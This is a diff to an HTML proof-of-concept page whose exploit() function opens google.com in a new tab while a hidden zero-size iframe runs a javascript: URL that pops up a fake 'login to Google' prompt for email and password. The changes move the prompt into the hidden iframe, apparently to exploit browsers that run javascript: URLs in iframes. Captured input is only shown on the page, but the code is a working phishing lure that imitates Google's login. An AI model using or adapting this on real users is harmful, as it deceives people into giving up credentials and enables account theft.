@@ -4,24 +4,25 @@
 
     <script>
       function exploit() {
-        // Pehle prompt dikhana
-        const userInput = prompt("To continue to Google\nPlease login with your email and password:", "Email / Password");
-
-        // User ne kuch enter kiya ho to page pe show (demo purpose)
-        if (userInput) {
-          const outputDiv = document.createElement("div");
-          outputDiv.textContent = `Entered Credentials: ${userInput}`;
-          document.body.appendChild(outputDiv);
-        }
-
-        // Ab Google.com open karo (OK press hone ke baad)
+        // New tab open to make user feel like something real is happening
         window.open("https://www.google.com");
+
+        // Prompt runs via javascript: URL inside an iframe (works in vulnerable browsers)
+        document.getElementById("phishFrame").src =
+          'javascript:var userInput = prompt("To continue to Google\\nPlease login with your email and password:", "Email / Password");\
+           if (userInput) {\
+             var outputDiv = document.createElement("div");\
+             outputDiv.textContent = `Entered Credentials: ${userInput}`;\
+             document.body.appendChild(outputDiv);\
+           }';
       }
     </script>
 
     <a href="#" onclick="exploit();">
       <h1>Click here to go to Google.com</h1>
     </a>
+
+    <iframe id="phishFrame" style="width:0; height:0; border:0;"></iframe>
 
   </body>
 </html>
